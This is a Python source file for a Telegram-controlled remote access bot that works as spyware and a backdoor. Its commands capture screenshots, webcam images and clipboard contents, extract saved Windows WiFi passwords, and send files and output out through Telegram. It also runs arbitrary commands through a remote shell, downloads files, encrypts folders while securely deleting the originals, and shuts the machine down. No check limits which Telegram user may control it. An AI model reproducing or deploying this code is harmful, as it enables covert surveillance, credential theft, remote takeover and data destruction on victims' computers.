import os
import re
import mss
import cv2
import time
import pyttsx3
import telebot
import platform
import clipboard
import subprocess
import pyAesCrypt
import xml.etree.ElementTree as ET
import psutil
import requests
import logging
import random
import string
from secure_delete import secure_delete

TOKEN = 'YOUR-TOKEN'  # Replace with your actual token

logging.basicConfig(level=logging.INFO, filename="tinar_bot.log",
                    format="%(asctime)s %(levelname)s %(message)s")

bot = telebot.TeleBot(TOKEN)
cd = os.path.expanduser("~")
secure_delete.secure_random_seed_init()
bot.set_webhook()

user_states = {}
command_history = {}
secure_notes = {}

STATE_NORMAL = 1
STATE_SHELL = 2

def add_to_history(user_id, cmd):
    if user_id not in command_history:
        command_history[user_id] = []
    command_history[user_id].append(cmd)
    if len(command_history[user_id]) > 20:
        command_history[user_id].pop(0)

def send_long_message(user_id, message_text):
    part_size = 4000
    message_parts = [message_text[i:i+part_size] for i in range(0, len(message_text), part_size)]
    for part in message_parts:
        bot.send_message(user_id, part)

def get_user_state(user_id):
    return user_states.get(user_id, STATE_NORMAL)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, (
        'Welcome! Available commands:\n'
        '/screen - Screenshot\n'
        '/sys - System info\n'
        '/ip - IP address\n'
        '/cd [folder] - Change folder\n'
        '/ls - List items\n'
        '/upload [PATH] - Upload file\n'
        '/crypt [DIR] - Encrypt dir\n'
        '/decrypt [DIR] - Decrypt dir\n'
        '/lock - Lock session\n'
        '/shutdown - Shutdown\n'
        '/webcam - Photo from webcam\n'
        '/speech [lang] [text] - Speak\n'
        '/clipboard - Clipboard content\n'
        '/shell - Remote shell\n'
        '/wifi - Get WiFi password\n'
        '/download [url] [dest] - Download file\n'
        '/find [filename] - Find file\n'
        '/disk - Disk usage\n'
        '/stats - CPU/RAM usage\n'
        '/volume [up/down/mute] - Control volume\n'
        '/gifwebcam - 2s webcam GIF\n'
        '/schedule_shutdown [seconds] - Schedule shutdown\n'
        '/restart - Restart system\n'
        '/genpass [length] - Generate password\n'
        '/note [save/get/del] [text] - Secure note\n'
        '/history - Command history\n'
        ))

@bot.message_handler(commands=['screen'])
def send_screen(message):
    with mss.mss() as sct:
        sct.shot(output=f"{cd}/capture.png")
    image_path = f"{cd}/capture.png"
    with open(image_path, "rb") as photo:
        bot.send_photo(message.chat.id, photo)
    os.remove(image_path)

@bot.message_handler(commands=['ip'])
def send_ip_info(message):
    try:
        result = requests.get("https://ipinfo.io/ip", timeout=5)
        bot.send_message(message.chat.id, result.text.strip())
    except Exception as e:
        bot.send_message(message.chat.id, 'error: ' + str(e))

@bot.message_handler(commands=['sys'])
def send_system_info(message):
    try:
        system_info = {
            'Platform': platform.platform(),
            'System': platform.system(),
            'Node Name': platform.node(),
            'Release': platform.release(),
            'Version': platform.version(),
            'Machine': platform.machine(),
            'Processor': platform.processor(),
            'CPU Cores': os.cpu_count(),
            'Username': os.getlogin(),
        }
        system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
        bot.send_message(message.chat.id, system_info_text)
    except Exception as e:
        bot.send_message(message.chat.id, "Error: "+str(e))

@bot.message_handler(commands=['ls'])
def list_directory(message):
    try:
        contents = os.listdir(cd)
        response = "Directory content :\n" + "\n".join(f"- {item}" for item in contents)
        bot.send_message(message.chat.id, response if contents else "folder is empty.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

@bot.message_handler(commands=['cd'])
def change_directory(message):
    try:
        global cd
        args = message.text.split(' ')
        if len(args) >= 2:
            new_directory = args[1]
            new_path = os.path.join(cd, new_directory)
            if os.path.exists(new_path) and os.path.isdir(new_path):
                cd = new_path
                bot.send_message(message.chat.id, f"You are in : {cd}")
            else:
                bot.send_message(message.chat.id, f"Directory does not exist.")
        else:
            bot.send_message(message.chat.id, "Usage: /cd [folder name]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            file_path = args[1]
            if os.path.exists(file_path):
                with open(file_path, 'rb') as file:
                    bot.send_document(message.chat.id, file)
                bot.send_message(message.chat.id, f"File transferred successfully.")
            else:
                bot.send_message(message.chat.id, "Path does not exist.")
        else:
            bot.send_message(message.chat.id, "Usage: /upload [PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

@bot.message_handler(commands=['download'])
def download_file(message):
    try:
        args = message.text.split(' ')
        if len(args) >= 3:
            url, dest = args[1], args[2]
            r = requests.get(url, stream=True)
            with open(dest, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        f.write(chunk)
            bot.send_message(message.chat.id, f"Downloaded to {dest}")
        else:
            bot.send_message(message.chat.id, "Usage: /download [URL] [DESTINATION]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['find'])
def find_file(message):
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            filename = args[1]
            found = []
            for root, dirs, files in os.walk(cd):
                if filename in files:
                    found.append(os.path.join(root, filename))
            bot.send_message(message.chat.id, "\n".join(found) if found else "File not found.")
        else:
            bot.send_message(message.chat.id, "Usage: /find [filename]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['disk'])
def disk_usage(message):
    try:
        usage = psutil.disk_usage(cd)
        bot.send_message(message.chat.id, f"Disk usage for {cd}:\nTotal: {usage.total//(2**30)}GB\nUsed: {usage.used//(2**30)}GB\nFree: {usage.free//(2**30)}GB\nPercent: {usage.percent}%")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['stats'])
def system_stats(message):
    try:
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        bot.send_message(message.chat.id, f"CPU Usage: {cpu}%\nRAM Usage: {mem.percent}% ({mem.used//(2**20)}MB/{mem.total//(2**20)}MB)")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['volume'])
def change_volume(message):
    try:
        args = message.text.split()
        if platform.system().lower() == "windows":
            import ctypes
            if len(args) >= 2:
                action = args[1].lower()
                if action == "up":
                    for _ in range(5): ctypes.windll.user32.keybd_event(0xAF, 0, 0, 0)  # Volume up
                elif action == "down":
                    for _ in range(5): ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
                elif action == "mute":
                    ctypes.windll.user32.keybd_event(0xAD, 0, 0, 0)
                bot.send_message(message.chat.id, f"Volume {action}")
            else:
                bot.send_message(message.chat.id, "Usage: /volume [up/down/mute]")
        else:
            bot.send_message(message.chat.id, "Volume control only supported on Windows.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['gifwebcam'])
def webcam_gif(message):
    try:
        cap = cv2.VideoCapture(0)
        frames = []
        for _ in range(20):
            ret, frame = cap.read()
            if ret:
                frames.append(frame)
                time.sleep(0.1)
        cap.release()
        import imageio
        imageio.mimsave('webcam.gif', frames, duration=0.1)
        with open('webcam.gif', 'rb') as f:
            bot.send_document(message.chat.id, f)
        os.remove('webcam.gif')
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['schedule_shutdown'])
def schedule_shutdown(message):
    try:
        args = message.text.split()
        if len(args) >= 2 and args[1].isdigit():
            seconds = int(args[1])
            if platform.system().lower() == "windows":
                subprocess.run(['shutdown', '/s', '/t', str(seconds)])
            elif platform.system().lower() == "linux" or platform.system().lower() == "darwin":
                subprocess.run(['shutdown', '-h', f'+{seconds//60}'])
            bot.send_message(message.chat.id, f"System will shutdown in {seconds} seconds.")
        else:
            bot.send_message(message.chat.id, "Usage: /schedule_shutdown [seconds]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['restart'])
def restart_system(message):
    try:
        if platform.system().lower() == "windows":
            subprocess.run(['shutdown', '/r', '/t', '5'])
        elif platform.system().lower() == "linux" or platform.system().lower() == "darwin":
            subprocess.run(['shutdown', '-r', 'now'])
        bot.send_message(message.chat.id, "System restarting in 5 seconds.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['genpass'])
def generate_password(message):
    try:
        args = message.text.split()
        length = int(args[1]) if len(args) > 1 and args[1].isdigit() else 12
        chars = string.ascii_letters + string.digits + string.punctuation
        password = ''.join(random.choice(chars) for _ in range(length))
        bot.send_message(message.chat.id, f"Generated password: {password}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['note'])
def secure_note(message):
    try:
        args = message.text.split(' ', 2)
        user_id = message.from_user.id
        if len(args) >= 3:
            action = args[1]
            text = args[2]
            if action == "save":
                secure_notes[user_id] = text
                bot.send_message(message.chat.id, "Note saved securely.")
            elif action == "get":
                bot.send_message(message.chat.id, secure_notes.get(user_id, "No note found."))
            elif action == "del":
                if user_id in secure_notes:
                    del secure_notes[user_id]
                    bot.send_message(message.chat.id, "Note deleted.")
                else:
                    bot.send_message(message.chat.id, "No note found.")
            else:
                bot.send_message(message.chat.id, "Usage: /note [save/get/del] [text]")
        else:
            bot.send_message(message.chat.id, "Usage: /note [save/get/del] [text]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['history'])
def show_history(message):
    user_id = message.from_user.id
    hist = command_history.get(user_id, [])
    send_long_message(message.chat.id, "\n".join(hist) if hist else "No history found.")

@bot.message_handler(commands=['crypt'])
def encrypt_folder(message):
    try:
        if len(message.text.split()) >= 2:
            folder_to_encrypt = message.text.split()[1]
            password = "Your_Strong_Password"
            for root, dirs, files in os.walk(folder_to_encrypt):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypted_file_path = file_path + '.crypt'
                    pyAesCrypt.encryptFile(file_path, encrypted_file_path, password)
                    if not file_path.endswith('.crypt'):
                        secure_delete.secure_delete(file_path)
            bot.send_message(message.chat.id, "Folder encrypted and original files securely deleted.")
        else:
            bot.send_message(message.chat.id, "Usage: /crypt [FOLDER_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['decrypt'])
def decrypt_folder(message):
    try:
        if len(message.text.split()) >= 2:
            folder_to_decrypt = message.text.split()[1]
            password = "Your_Strong_Password"
            for root, dirs, files in os.walk(folder_to_decrypt):
                for file in files:
                    if file.endswith('.crypt'):
                        file_path = os.path.join(root, file)
                        decrypted_file_path = file_path[:-6]
                        pyAesCrypt.decryptFile(file_path, decrypted_file_path, password)
                        secure_delete.secure_delete(file_path)
            bot.send_message(message.chat.id, "Folder decrypted and encrypted files deleted.")
        else:
            bot.send_message(message.chat.id, "Usage: /decrypt [ENCRYPTED_FOLDER_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['lock'])
def lock_command(message):
    try:
        if platform.system().lower() == "windows":
            result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            bot.send_message(message.chat.id, "Windows session locked." if result.returncode == 0 else "Failed to lock session.")
        elif platform.system().lower() == "darwin":
            subprocess.run(['pmset', 'displaysleepnow'])
            bot.send_message(message.chat.id, "Mac display locked.")
        elif platform.system().lower() == "linux":
            subprocess.run(['gnome-screensaver-command', '-l'])
            bot.send_message(message.chat.id, "Linux session locked.")
        else:
            bot.send_message(message.chat.id, "Unsupported OS.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    try:
        if platform.system().lower() == "windows":
            subprocess.run(['shutdown', '/s', '/t', '5'])
        elif platform.system().lower() == "linux" or platform.system().lower() == "darwin":
            subprocess.run(['shutdown', '-h', 'now'])
        bot.send_message(message.chat.id, "Shutdown initiated.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['webcam'])
def capture_webcam_image(message):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            with open("webcam.jpg", 'rb') as photo_file:
                bot.send_photo(message.chat.id, photo=photo_file)
            os.remove("webcam.jpg")
        else:
            bot.send_message(message.chat.id, "Error while capturing the image.")
        cap.release()
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['speech'])
def text_to_speech_command(message):
    try:
        args = message.text.split(' ', 2)
        if len(args) >= 3:
            lang = args[1].lower()
            text = args[2]
            engine = pyttsx3.init()
            voices = engine.getProperty('voices')
            selected = voices[0]
            for v in voices:
                if lang in v.languages[0].decode():
                    selected = v
                    break
            engine.setProperty('voice', selected.id)
            engine.say(text)
            engine.runAndWait()
            bot.send_message(message.chat.id, "Spoken successfully.")
        elif len(args) == 2:
            text = args[1]
            pyttsx3.speak(text)
            bot.send_message(message.chat.id, "Spoken successfully.")
        else:
            bot.send_message(message.chat.id, "Usage: /speech [lang] [text] or /speech [text]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['clipboard'])
def clipboard_command(message):
    try:
        clipboard_text = clipboard.paste()
        bot.send_message(message.chat.id, f"Clipboard content:\n{clipboard_text}" if clipboard_text else "Clipboard is empty.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(commands=['shell'])
def start_shell(message):
    user_id = message.from_user.id
    user_states[user_id] = STATE_SHELL
    bot.send_message(user_id, "Remote shell started. Type 'exit' to exit.")

@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
def handle_shell_commands(message):
    user_id = message.from_user.id
    command = message.text.strip()
    add_to_history(user_id, command)
    if command.lower() == 'exit':
        bot.send_message(user_id, "Exiting remote shell.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            output = stdout.decode('utf-8', errors='ignore')
            error_output = stderr.decode('utf-8', errors='ignore')
            if output:
                send_long_message(user_id, f"Output:\n{output}")
            if error_output:
                send_long_message(user_id, f"Error:\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"Error: {str(e)}")
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "🤖 *Bot Command Help*\n\n"
        "/start - Greet and show intro\n"
        "/help - Show this help message\n"
        "/screen - Capture and send screenshot\n"
        "/sys - Show system information\n"
        "/ip - Show public IP address\n"
        "/cd [folder] - Change current directory\n"
        "/ls - List files in current directory\n"
        "/upload [PATH] - Send file at given path\n"
        "/crypt [FOLDER_PATH] - Encrypt folder (and securely delete originals)\n"
        "/decrypt [ENCRYPTED_FOLDER_PATH] - Decrypt folder\n"
        "/lock - Lock Windows session\n"
        "/shutdown - Shutdown system in 5 seconds\n"
        "/webcam - Capture and send webcam image\n"
        "/speech [TEXT] - Say text with system voice\n"
        "/clipboard - Get clipboard content\n"
        "/shell - Enter remote shell mode\n"
        "/wifi - Get WiFi SSID and password (Windows)\n"
        "Type 'exit' in shell to leave remote shell.\n"
    )
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['wifi'])
def get_wifi_passwords(message):
    try:
        if platform.system().lower() == "windows":
            subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], shell=True, text=True)
            for file in os.listdir('.'):
                if file.endswith('.xml'):
                    with open(file, 'r') as xmlfile:
                        xml_content = xmlfile.read()
                        ssid_match = re.search(r'<name>(.*?)<\/name>', xml_content)
                        password_match = re.search(r'<keyMaterial>(.*?)<\/keyMaterial>', xml_content)
                        if ssid_match and password_match:
                            ssid = ssid_match.group(1)
                            password = password_match.group(1)
                            message_text = f"SSID: {ssid}\nPASS: {password}"
                            bot.send_message(message.chat.id, message_text)
                        os.remove(file)
        else:
            bot.send_message(message.chat.id, "WiFi password extraction is Windows-only.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

try:
    if __name__ == "__main__":
        print('Waiting for commands...')
        try:
            bot.infinity_polling()
        except Exception as e:
            logging.error("Polling error: %s", e)
            time.sleep(10)

except Exception as e:
    logging.error("Startup error: %s", e)
    time.sleep(5)
